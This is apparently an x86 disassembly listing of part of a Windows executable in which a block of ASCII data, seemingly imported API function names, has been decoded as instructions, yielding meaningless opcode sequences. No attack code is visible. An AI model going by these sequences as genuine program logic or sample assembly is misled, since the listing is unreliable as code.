  428d35:	add    BYTE PTR [ebx+0x6c],al
  428d38:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  428d3f:	arpl   WORD PTR [edx+0x65],si
  428d42:	outs   dx,BYTE PTR gs:[esi]
  428d44:	add    BYTE PTR [eax],al
  428d46:	push   ecx
  428d47:	add    dl,BYTE PTR [ebx+0x65]
  428d4a:	je     0x428d9c
  428d4c:	popa   
  428d4d:	jb     0x428db4
  428d4f:	outs   dx,BYTE PTR ds:[esi]
  428d50:	je     0x428d52
  428d52:	xchg   ecx,eax
  428d53:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428d57:	arpl   WORD PTR [ebx+0x50],bp
  428d5a:	outs   dx,DWORD PTR ds:[esi]
  428d5b:	jo     0x428dd2
  428d5d:	jo     0x428dac
  428d5f:	outs   dx,BYTE PTR gs:[esi]
  428d61:	jne    0x428da8
  428d63:	js     0x428d65
  428d65:	add    BYTE PTR [edx],ah
  428d67:	add    DWORD PTR [edi+0x65],eax
  428d6a:	je     0x428db7
  428d6c:	gs jns 0x428dd1
  428d6f:	outs   dx,DWORD PTR ds:[esi]
  428d70:	popa   
  428d71:	jb     0x428dd7
  428d73:	dec    esp
  428d74:	popa   
  428d75:	jns    0x428de6
  428d77:	jne    0x428ded
  428d79:	add    bl,bh
  428d7b:	add    BYTE PTR [edi+0x65],al
  428d7e:	je     0x428dc3
  428d80:	ins    BYTE PTR es:[edi],dx
  428d81:	popa   
  428d82:	jae    0x428df7
  428d84:	dec    esi
  428d85:	popa   
  428d86:	ins    DWORD PTR es:[edi],dx
  428d87:	gs push edi
  428d89:	add    ch,bl
  428d8b:	add    BYTE PTR [ebp+0x71],al
  428d8e:	jne    0x428df1
  428d90:	ins    BYTE PTR es:[edi],dx
  428d91:	push   edx
  428d92:	arpl   WORD PTR gs:[eax+eax*1+0x32],si
  428d97:	add    dl,BYTE PTR [ebx+0x65]
  428d9a:	je     0x428ddf
  428d9c:	popa   
  428d9d:	jb     0x428e04
  428d9f:	je     0x428df1
  428da1:	outs   dx,DWORD PTR ds:[esi]
  428da2:	jae    0x428da4
  428da4:	and    al,0x0
  428da6:	inc    ebx
  428da7:	push   0x65676e61
  428dac:	dec    ebp
  428dad:	outs   dx,BYTE PTR gs:[esi]
  428daf:	jne    0x428e08
  428db1:	add    BYTE PTR [eax+0x73654400],bl
  428db7:	je     0x428e2b
  428db9:	outs   dx,DWORD PTR ds:[esi]
  428dba:	jns    0x428e13
  428dbc:	imul   ebp,DWORD PTR [esi+0x64],0xf500776f
  428dc3:	add    DWORD PTR [eax+0x6f],edx
  428dc6:	jae    0x428e3c
  428dc8:	push   esp
  428dc9:	push   0x64616572
  428dce:	dec    ebp
  428dcf:	gs jae 0x428e45
  428dd2:	popa   
  428dd3:	addr16 gs push edi
  428dd6:	add    BYTE PTR [eax],al
  428dd8:	push   edi
  428dd9:	add    dl,BYTE PTR [ebx+0x65]
  428ddc:	je     0x428e2e
  428dde:	jb     0x428e4f
  428de0:	jo     0x428e39
  428de2:	add    BYTE PTR [eax],al
  428de4:	mov    al,0x1
  428de6:	dec    esp
  428de7:	outs   dx,DWORD PTR ds:[esi]
  428de8:	popa   
  428de9:	fs dec ecx
  428deb:	arpl   WORD PTR [edi+0x6e],bp
  428dee:	push   edi
  428def:	add    bl,bh
  428df1:	add    DWORD PTR [eax+0x74],edx
  428df4:	dec    ecx
  428df5:	outs   dx,BYTE PTR ds:[esi]
  428df6:	push   edx
  428df7:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428dfc:	dec    edx
  428dfd:	add    dl,BYTE PTR [ebx+0x65]
  428e00:	je     0x428e4f
  428e02:	outs   dx,BYTE PTR gs:[esi]
  428e04:	jne    0x428e4a
  428e06:	gs popaw 
  428e09:	jne    0x428e77
  428e0b:	je     0x428e56
  428e0d:	je     0x428e74
  428e0f:	ins    DWORD PTR es:[edi],dx
  428e10:	add    BYTE PTR [eax],al
  428e12:	sti    
  428e13:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428e17:	arpl   WORD PTR [ebx+0x50],bp
  428e1a:	outs   dx,DWORD PTR ds:[esi]
  428e1b:	jo     0x428e92
  428e1d:	jo     0x428e6c
  428e1f:	outs   dx,BYTE PTR gs:[esi]
  428e21:	jne    0x428e23
  428e23:	add    BYTE PTR [ebp+0x64705502],ah
  428e29:	popa   
  428e2a:	je     0x428e91
  428e2c:	push   edi
  428e2d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428e34:	push   ss
  428e35:	add    dl,BYTE PTR [edx+0x65]
  428e38:	ins    DWORD PTR es:[edi],dx
  428e39:	outs   dx,DWORD PTR ds:[esi]
  428e3a:	jbe    0x428ea1
  428e3c:	dec    ebp
  428e3d:	outs   dx,BYTE PTR gs:[esi]
  428e3f:	jne    0x428e41
  428e41:	add    BYTE PTR [edx+0x61724400],dh
  428e47:	ja     0x428e8f
  428e49:	jb     0x428eac
  428e4b:	ins    DWORD PTR es:[edi],dx
  428e4c:	gs inc ebx
  428e4e:	outs   dx,DWORD PTR ds:[esi]
  428e4f:	outs   dx,BYTE PTR ds:[esi]
  428e50:	je     0x428ec4
  428e52:	outs   dx,DWORD PTR ds:[esi]
  428e53:	ins    BYTE PTR es:[edi],dx
  428e54:	add    BYTE PTR [eax],al
  428e56:	mov    dl,0x1
  428e58:	dec    esp
  428e59:	outs   dx,DWORD PTR ds:[esi]
  428e5a:	popa   
  428e5b:	fs dec ecx
  428e5d:	ins    DWORD PTR es:[edi],dx
  428e5e:	popa   
  428e5f:	addr16 gs push edi
  428e62:	add    BYTE PTR [eax],al
  428e64:	add    al,BYTE PTR [eax]
  428e66:	inc    ecx
  428e67:	fs push 0x75
  428e6a:	jae    0x428ee0
  428e6c:	push   edi
  428e6d:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428e74:	arpl   WORD PTR [eax+eax*1+0x0],si
  428e78:	add    DWORD PTR [ecx],0x65536e49
  428e7e:	outs   dx,BYTE PTR ds:[esi]
  428e7f:	fs dec ebp
  428e81:	gs jae 0x428ef7
  428e84:	popa   
  428e85:	addr16 gs inc ebp
  428e88:	js     0x428e8a
  428e8a:	xchg   BYTE PTR [ecx],al
  428e8c:	dec    ecx
  428e8d:	outs   dx,BYTE PTR ds:[esi]
  428e8e:	jae    0x428ef5
  428e90:	jb     0x428f06
  428e92:	dec    ebp
  428e93:	outs   dx,BYTE PTR gs:[esi]
  428e95:	jne    0x428eee
  428e97:	add    BYTE PTR ds:0x6c6c4100,al
  428e9d:	outs   dx,DWORD PTR ds:[esi]
  428e9e:	ja     0x428ef3
  428ea0:	gs je  0x428ee9
  428ea3:	outs   dx,DWORD PTR ds:[esi]
  428ea4:	jb     0x428f0b
  428ea6:	addr16 jb 0x428f18
  428ea9:	jne    0x428f19
  428eab:	fs push edi
  428ead:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428eb4:	add    BYTE PTR [edx],0x53
  428eb7:	ja     0x428f1a
  428eb9:	jo     0x428f08
  428ebb:	outs   dx,DWORD PTR ds:[esi]
  428ebc:	jne    0x428f31
  428ebe:	gs inc edx
  428ec0:	jne    0x428f36
  428ec2:	je     0x428f33
  428ec4:	outs   dx,BYTE PTR ds:[esi]
  428ec5:	add    bh,ch
  428ec7:	add    DWORD PTR [eax+0x65],edx
  428eca:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  428ecf:	jae    0x428f32
  428ed1:	addr16 gs push edi
  428ed4:	add    BYTE PTR [eax],al
  428ed6:	cdq    
  428ed7:	add    BYTE PTR [ecx+ebp*2+0x61],al
  428edb:	ins    BYTE PTR es:[edi],dx
  428edc:	outs   dx,DWORD PTR ds:[esi]
  428edd:	addr16 inc edx
  428edf:	outs   dx,DWORD PTR ds:[esi]
  428ee0:	js     0x428f2b
  428ee2:	outs   dx,BYTE PTR ds:[esi]
  428ee3:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428eeb:	jb     0x428f4e
  428eed:	ins    DWORD PTR es:[edi],dx
  428eee:	inc    ecx
  428eef:	add    BYTE PTR [ebp+0x0],bl
  428ef2:	inc    ebx
  428ef3:	jb     0x428f5a
  428ef5:	popa   
  428ef6:	je     0x428f5d
  428ef8:	dec    ecx
  428ef9:	arpl   WORD PTR [edi+0x6e],bp
  428efc:	dec    ecx
  428efd:	outs   dx,BYTE PTR ds:[esi]
  428efe:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  428f06:	stos   BYTE PTR es:[edi],al
  428f07:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428f0b:	fs inc edx
  428f0d:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb1005770
  428f15:	add    dl,BYTE PTR [esi+0x6b]
  428f18:	dec    ebx
  428f19:	gs jns 0x428f6f
  428f1c:	arpl   WORD PTR [ecx+0x6e],sp
  428f1f:	push   edi
  428f20:	add    BYTE PTR [eax],al
  428f22:	adc    eax,DWORD PTR [ecx]
  428f24:	inc    edi
  428f25:	gs je  0x428f6c
  428f28:	outs   dx,DWORD PTR ds:[esi]
  428f29:	jne    0x428f8d
  428f2b:	ins    BYTE PTR es:[edi],dx
  428f2c:	gs inc ebx
  428f2e:	ins    BYTE PTR es:[edi],dx
  428f2f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  428f36:	add    BYTE PTR [eax],al
  428f38:	add    WORD PTR [edi+0x65],ax
  428f3c:	je     0x428f93
  428f3e:	jae    0x428fa5
  428f40:	jb     0x428f91
  428f42:	bound  ebp,QWORD PTR [edx+0x65]
  428f45:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f49:	outs   dx,WORD PTR ds:[esi]
  428f4b:	jb     0x428fba
  428f4d:	popa   
  428f4e:	je     0x428fb9
  428f50:	outs   dx,DWORD PTR ds:[esi]
  428f51:	outs   dx,BYTE PTR ds:[esi]
  428f52:	push   edi
  428f53:	add    BYTE PTR [eax+0x1],bl
  428f56:	inc    edi
  428f57:	gs je  0x428fad
  428f5a:	jne    0x428fbe
  428f5c:	dec    ebp
  428f5d:	outs   dx,BYTE PTR gs:[esi]
  428f5f:	jne    0x428f61
  428f61:	add    dh,dh
  428f63:	add    BYTE PTR [edi+0x65],al
  428f66:	je     0x428fab
  428f68:	ins    BYTE PTR es:[edi],dx
  428f69:	popa   
  428f6a:	jae    0x428fdf
  428f6c:	dec    ecx
  428f6d:	outs   dx,BYTE PTR ds:[esi]
  428f6e:	outs   dx,WORD PTR ds:[esi]
  428f70:	inc    ebp
  428f71:	js     0x428fca
  428f73:	add    BYTE PTR [ecx+eax*1],cl
  428f76:	inc    edi
  428f77:	gs je  0x428fbe
  428f7a:	gs jae 0x428fe8
  428f7d:	je     0x428fee
  428f7f:	jo     0x428fd8
  428f81:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428f88:	sub    eax,0x6e655302
  428f8d:	fs dec esi
  428f8f:	outs   dx,DWORD PTR ds:[esi]
  428f90:	je     0x428ffb
  428f92:	data16 jns 0x428fe2
  428f95:	gs jae 0x42900b
  428f98:	popa   
  428f99:	addr16 gs push edi
  428f9c:	add    BYTE PTR [eax],al
  428f9e:	and    al,BYTE PTR [edx]
  428fa0:	push   ebx
  428fa1:	outs   dx,BYTE PTR gs:[esi]
  428fa3:	fs inc esp
  428fa5:	ins    BYTE PTR es:[edi],dx
  428fa6:	addr16 dec ecx
  428fa8:	je     0x42900f
  428faa:	ins    DWORD PTR es:[edi],dx
  428fab:	dec    ebp
  428fac:	gs jae 0x429022
  428faf:	popa   
  428fb0:	addr16 gs push edi
  428fb3:	add    BYTE PTR [eax],ch
  428fb5:	add    DWORD PTR [edi+0x65],eax
  428fb8:	je     0x429006
  428fba:	popa   
  428fbb:	jae    0x429031
  428fbd:	inc    ecx
  428fbe:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428fc2:	gs push eax
  428fc4:	outs   dx,DWORD PTR ds:[esi]
  428fc5:	jo     0x42903c
  428fc7:	jo     0x428fc9
  428fc9:	add    BYTE PTR [ecx],ch
  428fcb:	add    BYTE PTR [ebx+0x68],al
  428fce:	popa   
  428fcf:	jb     0x42901d
  428fd1:	outs   dx,DWORD PTR ds:[esi]
  428fd2:	ja     0x429039
  428fd4:	jb     0x42902d
  428fd6:	add    BYTE PTR [eax],al
  428fd8:	xor    al,BYTE PTR [ecx]
  428fda:	inc    edi
  428fdb:	gs je  0x42902b
  428fde:	outs   dx,BYTE PTR gs:[esi]
  428fe0:	jne    0x42902b
  428fe2:	je     0x429049
  428fe4:	ins    DWORD PTR es:[edi],dx
  428fe5:	inc    ebx
  428fe6:	outs   dx,DWORD PTR ds:[esi]
  428fe7:	jne    0x429057
  428fe9:	je     0x428feb
  428feb:	add    BYTE PTR ds:0x74655302,bh
  428ff1:	inc    esp
  428ff2:	ins    BYTE PTR es:[edi],dx
  428ff3:	addr16 dec ecx
  428ff5:	je     0x42905c
  428ff7:	ins    DWORD PTR es:[edi],dx
  428ff8:	dec    ecx
  428ff9:	outs   dx,BYTE PTR ds:[esi]
  428ffa:	je     0x428ffc
  428ffc:	mov    al,ds:0x57734901
  429001:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  429008:	mov    ds:0x57734901,al
  42900d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  429014:	imul   esp,DWORD PTR [ebx+0x6f],0xe7006564
  42901b:	add    DWORD PTR [edi+0x70],ecx
  42901e:	outs   dx,BYTE PTR gs:[esi]
  429020:	inc    esp
  429021:	gs jae 0x42908f
  429024:	je     0x429095
  429026:	jo     0x42907f
  429028:	add    BYTE PTR [eax],al
  42902a:	cmp    al,BYTE PTR [eax]
  42902c:	inc    ebx
  42902d:	push   0x446b6365
  429032:	ins    BYTE PTR es:[edi],dx
  429033:	addr16 inc edx
  429035:	jne    0x4290ab
  429037:	je     0x4290a8
  429039:	outs   dx,BYTE PTR ds:[esi]
  42903a:	add    BYTE PTR [eax],al
  42903c:	mov    eax,DWORD PTR [ecx]
  42903e:	dec    ecx
  42903f:	outs   dx,BYTE PTR ds:[esi]
  429040:	jbe    0x4290a7
  429042:	jb     0x4290b8
  429044:	push   edx
  429045:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42904a:	pop    DWORD PTR [eax]
  42904c:	inc    esp
  42904d:	gs push di
  429050:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  429057:	outs   dx,DWORD PTR ds:[esi]
  429058:	arpl   WORD PTR [edi+0x0],dx
  42905b:	add    BYTE PTR ds:0x74654701,cl
  429061:	inc    esp
  429062:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  429069:	jae    0x4290d0
  42906b:	push   ebp
  42906c:	outs   dx,BYTE PTR ds:[esi]
  42906d:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x47016500
  429075:	gs je  0x4290cd
  429078:	jae    0x4290df
  42907a:	jb     0x4290cb
  42907c:	bound  ebp,QWORD PTR [edx+0x65]
  42907f:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  429083:	outs   dx,WORD PTR ds:[esi]
  429085:	jb     0x4290f4
  429087:	popa   
  429088:	je     0x4290f3
  42908a:	outs   dx,DWORD PTR ds:[esi]
  42908b:	outs   dx,BYTE PTR ds:[esi]
  42908c:	inc    ecx
  42908d:	add    BYTE PTR [ecx+0x44734901],bl
  429093:	ins    BYTE PTR es:[edi],dx
  429094:	addr16 inc edx
  429096:	jne    0x42910c
  429098:	je     0x429109
  42909a:	outs   dx,BYTE PTR ds:[esi]
  42909b:	inc    ebx
  42909c:	push   0x656b6365
  4290a1:	add    BYTE PTR fs:[eax],al
  4290a4:	ins    DWORD PTR es:[edi],dx
  4290a5:	add    DWORD PTR [edi+0x65],eax
  4290a8:	je     0x429101
  4290aa:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4290b1:	outs   dx,BYTE PTR ds:[esi]
  4290b2:	addr16 push edi
  4290b4:	add    BYTE PTR [eax],al
  4290b6:	popa   
  4290b7:	add    BYTE PTR [ebx+0x72],al
  4290ba:	gs popa 
  4290bc:	je     0x429123
  4290be:	push   eax
  4290bf:	outs   dx,DWORD PTR ds:[esi]
  4290c0:	jo     0x429137
  4290c2:	jo     0x429111
  4290c4:	outs   dx,BYTE PTR gs:[esi]
  4290c6:	jne    0x4290c8
  4290c8:	sbb    eax,DWORD PTR [eax]
  4290ca:	inc    ebx
  4290cb:	popa   
  4290cc:	ins    BYTE PTR es:[edi],dx
  4290cd:	ins    BYTE PTR es:[edi],dx
  4290ce:	push   edi
  4290cf:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4290d6:	outs   dx,DWORD PTR ds:[esi]
  4290d7:	arpl   WORD PTR [edi+0x0],dx
  4290da:	stos   DWORD PTR es:[edi],eax
  4290db:	add    BYTE PTR [edx+esi*2+0x61],al
  4290df:	ja     0x429122
  4290e1:	outs   dx,BYTE PTR ds:[esi]
  4290e2:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  4290e9:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  4290ee:	sahf   
  4290ef:	add    DWORD PTR [ecx+0x73],ecx
  4290f2:	push   edx
  4290f3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4290f8:	jo     0x42916e
  4290fa:	jns    0x4290fc
  4290fc:	inc    BYTE PTR [eax]
  4290fe:	inc    edi
  4290ff:	gs je  0x429145
  429102:	ins    BYTE PTR es:[edi],dx
  429103:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  42910a:	jb     0x42910c
  42910c:	lds    eax,FWORD PTR [eax]
  42910e:	inc    ebp
  42910f:	outs   dx,BYTE PTR ds:[esi]
  429110:	fs push eax
  429112:	popa   
  429113:	imul   ebp,DWORD PTR [esi+0x74],0xdc0000
  42911a:	inc    ebp
  42911b:	outs   dx,BYTE PTR ds:[esi]
  42911c:	jne    0x42918b
  42911e:	push   edi
  42911f:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  429126:	xchg   DWORD PTR [ecx],eax
  429128:	dec    ecx
  429129:	outs   dx,BYTE PTR ds:[esi]
  42912a:	je     0x429191
  42912c:	jb     0x42919c
  42912e:	popa   
  42912f:	ins    BYTE PTR es:[edi],dx
  429130:	inc    edi
  429131:	gs je  0x42918b
  429134:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  42913b:	js     0x4291b1
  42913d:	add    BYTE PTR [eax+0x43734901],dl
  429143:	push   0x6f4c7261
  429148:	ja     0x4291af
  42914a:	jb     0x42918d
  42914c:	add    BYTE PTR [eax],al
  42914e:	aad    0x1
  429150:	dec    ebp
  429151:	gs jae 0x4291c7
  429154:	popa   
  429155:	addr16 gs inc edx
  429158:	outs   dx,DWORD PTR ds:[esi]
  429159:	js     0x4291b2
  42915b:	add    BYTE PTR [edi+0x636f4c01],bh
  429161:	imul   edx,DWORD PTR [edi+0x69],0x6e
  429165:	outs   dx,DWORD PTR fs:[esi]
  429167:	ja     0x4291be
  429169:	jo     0x4291cf
  42916b:	popa   
  42916c:	je     0x4291d3
  42916e:	add    BYTE PTR [eax],al
  429170:	add    BYTE PTR es:[ebx+0x68],al
  429174:	popa   
  429175:	jb     0x4291c3
  429177:	outs   dx,DWORD PTR ds:[esi]
  429178:	ja     0x4291df
  42917a:	jb     0x4291bd
  42917c:	add    BYTE PTR [eax],al
  42917e:	call   0x6e6f:0x696e5502
  429185:	push   edx
  429186:	arpl   WORD PTR gs:[eax+eax*1+0x38],si
  42918b:	add    DWORD PTR [edi+0x65],eax
  42918e:	je     0x4291dd
  429190:	outs   dx,BYTE PTR gs:[esi]
  429192:	jne    0x4291e7
  429194:	je     0x429208
  429196:	imul   ebp,DWORD PTR [esi+0x67],0xd9000041
  42919d:	add    DWORD PTR [ebp+0x6f],ecx
  4291a0:	outs   dx,BYTE PTR ds:[esi]
  4291a1:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4291a9:	push   edx
  4291aa:	arpl   WORD PTR gs:[eax+eax*1+0x6d],si
  4291af:	add    dl,BYTE PTR [ebx+0x65]
  4291b2:	je     0x42920b
  4291b4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4291bb:	outs   dx,BYTE PTR ds:[esi]
  4291bc:	addr16 inc ecx
  4291be:	add    BYTE PTR [eax],al
  4291c0:	or     al,0x0
  4291c2:	inc    edx
  4291c3:	imul   ebp,DWORD PTR gs:[bp+0x44],0x72656665
  4291cc:	push   edi
  4291cd:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4291d4:	jae    0x4291d6
  4291d6:	add    BYTE PTR cs:[ebx+0x68],al
  4291da:	popa   
  4291db:	jb     0x42922d
  4291dd:	jb     0x429244
  4291df:	jbe    0x429222
  4291e1:	add    bl,bl
  4291e3:	add    DWORD PTR [ebp+0x6f],ecx
  4291e6:	jbe    0x42924d
  4291e8:	push   edi
  4291e9:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4291f0:	mov    dh,0x1
  4291f2:	dec    esp
  4291f3:	outs   dx,DWORD PTR ds:[esi]
  4291f4:	popa   
  4291f5:	fs dec ebp
  4291f7:	outs   dx,BYTE PTR gs:[esi]
  4291f9:	jne    0x42923c
  4291fb:	add    BYTE PTR [ebp+0x79656b02],bh
  429201:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  429205:	jbe    0x42926c
  429207:	outs   dx,BYTE PTR ds:[esi]
  429208:	je     0x42920a
  42920a:	pop    esp
  42920b:	add    DWORD PTR [edi+0x65],eax
  42920e:	je     0x429263
  429210:	jns    0x429285
  429212:	je     0x429279
  429214:	ins    DWORD PTR es:[edi],dx
  429215:	dec    ebp
  429216:	gs je  0x42928b
  429219:	imul   esp,DWORD PTR [ebx+0x73],0x1af0000
  429220:	dec    esp
  429221:	outs   dx,DWORD PTR ds:[esi]
  429222:	popa   
  429223:	fs dec ecx
  429225:	arpl   WORD PTR [edi+0x6e],bp
  429228:	inc    ecx
  429229:	add    BYTE PTR [ebx+0x1],al
  42922c:	inc    edi
  42922d:	gs je  0x42927e
  429230:	gs js  0x4292a7
  429233:	inc    esp
  429234:	ins    BYTE PTR es:[edi],dx
  429235:	addr16 push esp
  429237:	popa   
  429238:	bound  ecx,QWORD PTR [ecx+0x74]
  42923b:	gs ins DWORD PTR es:[edi],dx
  42923d:	add    BYTE PTR [ebx+0x61724400],dh
  429243:	ja     0x42928e
  429245:	arpl   WORD PTR [edi+0x6e],bp
  429248:	add    BYTE PTR [eax],al
  42924a:	std    
  42924b:	add    BYTE PTR [edi+0x65],al
  42924e:	je     0x429293
  429250:	ins    BYTE PTR es:[edi],dx
  429251:	imul   esp,DWORD PTR [ebp+0x6e],0x63655274
  429258:	je     0x42925a
  42925a:	add    DWORD PTR ds:[edi+0x65],eax
  42925e:	je     0x4292ad
  429260:	gs jae 0x4292d6
  429263:	popa   
  429264:	addr16 gs push edi
  429267:	add    BYTE PTR [edx+0x1],al
  42926a:	inc    edi
  42926b:	gs je  0x4292bc
  42926e:	gs js  0x4292e5
  429271:	inc    esp
  429272:	ins    BYTE PTR es:[edi],dx
  429273:	addr16 inc edi
  429275:	jb     0x4292e6
  429277:	jne    0x4292e9
  429279:	dec    ecx
  42927a:	je     0x4292e1
  42927c:	ins    DWORD PTR es:[edi],dx
  42927d:	add    BYTE PTR ds:0x6c655202,dl
  429283:	gs popa 
  429285:	jae    0x4292ec
  429287:	inc    esp
  429288:	inc    ebx
  429289:	add    BYTE PTR [ebp+0x53],dl
  42928c:	inc    ebp
  42928d:	push   edx
  42928e:	xor    esi,DWORD PTR [edx]
  429290:	cs fs ins BYTE PTR es:[edi],dx
  429293:	ins    BYTE PTR es:[edi],dx
  429294:	add    BYTE PTR [eax],al
  429296:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  42929a:	jbe    0x429301
  42929c:	inc    esi
  42929d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x71004178
  4292a5:	add    DWORD PTR [esi+0x69],eax
  4292a8:	outs   dx,BYTE PTR ds:[esi]
  4292a9:	fs push edx
  4292ab:	gs jae 0x42931d
  4292ae:	jne    0x429322
  4292b0:	arpl   WORD PTR [ebp+0x45],sp
  4292b3:	js     0x42930c
  4292b5:	add    BYTE PTR [ebx],dl
  4292b7:	add    al,0x53
  4292b9:	gs je  0x4292ff
  4292bc:	jne    0x429330
  4292be:	jb     0x429325
  4292c0:	outs   dx,BYTE PTR ds:[esi]
  4292c1:	je     0x429307
  4292c3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4292ca:	jns    0x42930d
  4292cc:	add    BYTE PTR [eax],al
  4292ce:	sub    BYTE PTR [ebx+edx*2],al
  4292d1:	gs je  0x42931c
  4292d4:	popa   
  4292d5:	outs   dx,BYTE PTR ds:[esi]
  4292d6:	fs ins BYTE PTR es:[edi],dx
  4292d8:	gs inc ebx
  4292da:	outs   dx,DWORD PTR ds:[esi]
  4292db:	jne    0x42934b
  4292dd:	je     0x4292df
  4292df:	add    BYTE PTR [ebx+0x6d6f4300],dh
  4292e5:	jo     0x429348
  4292e7:	jb     0x42934e
  4292e9:	push   ebx
  4292ea:	je     0x42935e
  4292ec:	imul   ebp,DWORD PTR [esi+0x67],0x52000041
  4292f3:	add    DWORD PTR [esi+0x69],eax
  4292f6:	ins    BYTE PTR es:[edi],dx
  4292f7:	gs push esp
  4292f9:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  429300:	arpl   WORD PTR [ecx+0x6c],sp
  429303:	inc    esi
  429304:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  42930c:	cmp    eax,DWORD PTR [ebx+edx*2]
  42930f:	gs je  0x429365
  429312:	jns    0x429387
  429314:	je     0x42937b
  429316:	ins    DWORD PTR es:[edi],dx
  429317:	push   esp
  429318:	imul   ebp,DWORD PTR [ebp+0x65],0x47018e00
  42931f:	gs je  0x429363
  429322:	inc    ebx
  429323:	push   eax
  429324:	add    BYTE PTR [eax],al
  429326:	arpl   WORD PTR [ecx],ax
  429328:	inc    esi
  429329:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  429330:	je     0x429378
  429332:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x33f0000
  42933a:	dec    esp
  42933b:	outs   dx,DWORD PTR ds:[esi]
  42933c:	popa   
  42933d:	fs dec esp
  42933f:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  429346:	add    BYTE PTR [eax],al
  429348:	push   ss
  429349:	add    DWORD PTR [ebp+0x6e],eax
  42934c:	je     0x4293b3
  42934e:	jb     0x429393
  429350:	jb     0x4293bb
  429352:	je     0x4293bd
  429354:	arpl   WORD PTR [ecx+0x6c],sp
  429357:	push   ebx
  429358:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  42935d:	outs   dx,BYTE PTR ds:[esi]
  42935e:	add    BYTE PTR [eax],al
  429360:	cdq    
  429361:	add    DWORD PTR [edi+0x65],eax
  429364:	je     0x4293a9
  429366:	outs   dx,DWORD PTR ds:[esi]
  429367:	ins    DWORD PTR es:[edi],dx
  429368:	ins    DWORD PTR es:[edi],dx
  429369:	inc    ebx
  42936a:	outs   dx,DWORD PTR ds:[esi]
  42936b:	outs   dx,BYTE PTR ds:[esi]
  42936c:	imul   sp,WORD PTR [edi+0x0],0x188
  429372:	inc    esi
  429373:	jb     0x4293da
  429375:	gs push edx
  429377:	gs jae 0x4293e9
  42937a:	jne    0x4293ee
  42937c:	arpl   WORD PTR [ebp+0x0],sp
  42937f:	add    BYTE PTR [eax+0x1],ah
  429382:	inc    esi
  429383:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42938a:	je     0x4293d2
  42938c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x1930000
  429394:	inc    edi
  429395:	gs je  0x4293da
  429398:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  42939f:	jo     0x429406
  4293a1:	push   edi
  4293a2:	add    BYTE PTR [eax],al
  4293a4:	fiadd  WORD PTR [esp+ebp*2]
  4293a7:	jae    0x42941d
  4293a9:	jb     0x429417
  4293ab:	outs   dx,BYTE PTR gs:[esi]
  4293ad:	push   edi
  4293ae:	add    BYTE PTR [eax],al
  4293b0:	pop    ds
  4293b1:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4293b5:	popa   
  4293b6:	ins    BYTE PTR es:[edi],dx
  4293b7:	push   ebx
  4293b8:	imul   edi,DWORD PTR [edx+0x65],0x47025700
  4293bf:	gs je  0x429415
  4293c2:	jns    0x429437
  4293c4:	je     0x42942b
  4293c6:	ins    DWORD PTR es:[edi],dx
  4293c7:	inc    esp
  4293c8:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4293cf:	jns    0x429412
  4293d1:	add    BYTE PTR [esi+0x74654701],ah
  4293d7:	inc    ebx
  4293d8:	outs   dx,DWORD PTR ds:[esi]
  4293d9:	ins    DWORD PTR es:[edi],dx
  4293da:	jo     0x429451
  4293dc:	je     0x429443
  4293de:	jb     0x42942e
  4293e0:	popa   
  4293e1:	ins    DWORD PTR es:[edi],dx
  4293e2:	gs push edi
  4293e4:	add    BYTE PTR [eax],al
  4293e6:	rol    BYTE PTR [eax],cl
  4293e8:	inc    ebx
  4293e9:	jb     0x429450
  4293eb:	popa   
  4293ec:	je     0x429453
  4293ee:	inc    esi
  4293ef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4293f7:	outs   dx,BYTE PTR ds:[esi]
  4293f8:	addr16 inc ecx
  4293fa:	add    BYTE PTR [eax],al
  4293fc:	retf   0x4300
  4293ff:	jb     0x429466
  429401:	popa   
  429402:	je     0x429469
  429404:	inc    esp
